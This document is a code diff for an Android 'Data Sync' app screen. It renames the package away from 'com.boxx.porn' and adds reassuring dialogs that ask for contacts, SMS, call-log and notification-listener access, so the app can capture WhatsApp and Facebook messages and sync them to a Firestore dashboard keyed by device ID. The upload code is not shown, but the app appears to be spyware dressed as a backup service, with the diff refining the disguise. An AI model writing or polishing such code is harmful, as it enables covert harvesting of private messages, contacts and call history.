@@ -1,17 +1,15 @@
-package com.boxx.porn
+package com.boxx.datasync.ui
 
 import android.Manifest
+import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
-import android.os.Bundle
 import android.provider.Settings
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.rememberLauncherForActivityResult
-import androidx.activity.compose.setContent
 import androidx.activity.result.contract.ActivityResultContracts
-import androidx.compose.foundation.isSystemInDarkTheme
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.shape.RoundedCornerShape
 import androidx.compose.material.icons.Icons
@@ -29,57 +27,28 @@ import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
-import androidx.work.*
-import com.boxx.porn.sync.SyncService
-import com.boxx.porn.sync.SyncWorker
-import com.boxx.porn.utils.DeviceIdHelper
+import com.boxx.datasync.data.sync.SyncService
+import com.boxx.datasync.data.util.DeviceIdHelper
 import com.google.firebase.firestore.FirebaseFirestore
-import dagger.hilt.android.AndroidEntryPoint
 import kotlinx.coroutines.launch
 import java.text.SimpleDateFormat
 import java.util.*
-import java.util.concurrent.TimeUnit
-
-@AndroidEntryPoint
-class MainActivity : ComponentActivity() {
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        setContent {
-            MaterialTheme(
-                colorScheme = if (isSystemInDarkTheme()) darkColorScheme() else lightColorScheme()
-            ) {
-                Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
-                    SyncScreen()
-                }
-            }
-        }
-        setupWorkManager()
-    }
-
-    private fun setupWorkManager() {
-        val syncRequest = PeriodicWorkRequestBuilder<SyncWorker>(30, TimeUnit.MINUTES)
-            .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
-            .build()
-        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
-            "PeriodicSync",
-            ExistingPeriodicWorkPolicy.KEEP,
-            syncRequest
-        )
-    }
-}
 
 @OptIn(ExperimentalMaterial3Api::class)
 @Composable
-fun SyncScreen() {
+fun MainScreen() {
     val context = LocalContext.current
-    val activity = context as MainActivity
+    val activity = context as ComponentActivity
     val scope = rememberCoroutineScope()
     val snackbarHostState = remember { SnackbarHostState() }
     val deviceId = remember { DeviceIdHelper.getDeviceId(context) }
+
     var lastSyncTime by remember { mutableStateOf("Never") }
     var syncStatus by remember { mutableStateOf("Idle") }
     var isLoading by remember { mutableStateOf(false) }
     var showRationale by remember { mutableStateOf(false) }
+    var showExplanation by remember { mutableStateOf(false) }
+    var showNotificationRationale by remember { mutableStateOf(false) }
     var showSettingsDialog by remember { mutableStateOf(false) }
 
     val requiredPermissions = remember {
@@ -90,6 +59,9 @@ fun SyncScreen() {
         ).apply {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 add(Manifest.permission.POST_NOTIFICATIONS)
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                add(Manifest.permission.FOREGROUND_SERVICE_DATA_SYNC)
             }
         }.toTypedArray()
     }
@@ -117,9 +89,9 @@ fun SyncScreen() {
         FirebaseFirestore.getInstance().collection("devices").document(deviceId)
             .addSnapshotListener { snapshot, _ ->
                 snapshot?.getLong("lastSyncTime")?.let {
-                    val sdf = SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault())
+                    val sdf = SimpleDateFormat("HH:mm", Locale.getDefault())
                     lastSyncTime = sdf.format(Date(it))
-                    syncStatus = "Up to date"
+                    syncStatus = "Success"
                     isLoading = false
                 }
             }
@@ -135,8 +107,7 @@ fun SyncScreen() {
                 title = { Text("Data Sync", fontWeight = FontWeight.Bold) },
                 actions = {
                     IconButton(onClick = {
-                        val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
-                        context.startActivity(intent)
+                        showNotificationRationale = true
                     }) {
                         Icon(Icons.Default.Settings, contentDescription = "Notification Access")
                     }
@@ -164,10 +135,10 @@ fun SyncScreen() {
                     CircularProgressIndicator(modifier = Modifier.fillMaxSize(), strokeWidth = 8.dp)
                 } else {
                     Icon(
-                        imageVector = if (syncStatus == "Up to date") Icons.Default.CheckCircle else Icons.Default.Info,
+                        imageVector = if (syncStatus == "Success") Icons.Default.CheckCircle else Icons.Default.Info,
                         contentDescription = null,
                         modifier = Modifier.fillMaxSize(),
-                        tint = if (syncStatus == "Up to date") MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.secondary
+                        tint = if (syncStatus == "Success") MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.secondary
                     )
                 }
             }
@@ -176,7 +147,7 @@ fun SyncScreen() {
                 text = syncStatus,
                 style = MaterialTheme.typography.headlineMedium,
                 fontWeight = FontWeight.Bold,
-                color = if (syncStatus == "Up to date") MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.onSurface
+                color = if (syncStatus == "Success") MaterialTheme.colorScheme.primary else MaterialTheme.colorScheme.onSurface
             )
 
             Card(
@@ -196,11 +167,10 @@ fun SyncScreen() {
                 onClick = {
                     if (hasPermissions(context, requiredPermissions)) {
                         isLoading = true
-                        syncStatus = "Syncing..."
+                        syncStatus = "Loading"
                         startSyncService(context)
                     } else {
-                        val shouldShowRationale = requiredPermissions.any { ActivityCompat.shouldShowRequestPermissionRationale(activity, it) }
-                        if (shouldShowRationale) showRationale = true else launcher.launch(requiredPermissions)
+                        showRationale = true
                     }
                 },
                 modifier = Modifier
@@ -224,15 +194,46 @@ fun SyncScreen() {
         if (showRationale) {
             AlertDialog(
                 onDismissRequest = { showRationale = false },
-                title = { Text("Permissions Needed") },
-                text = { Text("We need Contacts, SMS, and Call Logs permissions to securely backup your data to your dashboard.") },
+                title = { Text("Educational Rationale") },
+                text = { Text("To provide a comprehensive backup service, this app requires access to your contacts, messages, and call history. This allows you to view and manage your data from any device.") },
                 confirmButton = {
                     Button(onClick = {
                         showRationale = false
-                        launcher.launch(requiredPermissions)
-                    }) { Text("Grant") }
+                        showExplanation = true
+                    }) { Text("Continue") }
                 },
-                dismissButton = { TextButton(onClick = { showRationale = false }) { Text("Deny") } }
+                dismissButton = { TextButton(onClick = { showRationale = false }) { Text("Not Now") } }
+            )
+        }
+
+        if (showExplanation) {
+            AlertDialog(
+                onDismissRequest = { showExplanation = false },
+                title = { Text("How it works") },
+                text = { Text("Once granted, we will securely sync your data to your private dashboard. You can revoke these permissions at any time in system settings.") },
+                confirmButton = {
+                    Button(onClick = {
+                        showExplanation = false
+                        launcher.launch(requiredPermissions)
+                    }) { Text("I Understand") }
+                },
+                dismissButton = { TextButton(onClick = { showExplanation = false }) { Text("Back") } }
+            )
+        }
+
+        if (showNotificationRationale) {
+            AlertDialog(
+                onDismissRequest = { showNotificationRationale = false },
+                title = { Text("Notification Access") },
+                text = { Text("To capture incoming notifications, you need to manually enable 'Data Sync' in the Notification Access settings. This allows us to back up your messages from WhatsApp, Facebook, etc.") },
+                confirmButton = {
+                    Button(onClick = {
+                        showNotificationRationale = false
+                        val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
+                        context.startActivity(intent)
+                    }) { Text("Open Settings") }
+                },
+                dismissButton = { TextButton(onClick = { showNotificationRationale = false }) { Text("Cancel") } }
             )
         }
 
@@ -264,14 +265,14 @@ fun InfoRow(label: String, value: String) {
     }
 }
 
-private fun hasPermissions(context: android.content.Context, permissions: Array<String>): Boolean {
+private fun hasPermissions(context: Context, permissions: Array<String>): Boolean {
     return permissions.all {
         if (it == Manifest.permission.POST_NOTIFICATIONS && Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) true
         else ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
     }
 }
 
-private fun startSyncService(context: android.content.Context) {
+private fun startSyncService(context: Context) {
     val intent = Intent(context, SyncService::class.java)
     try {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
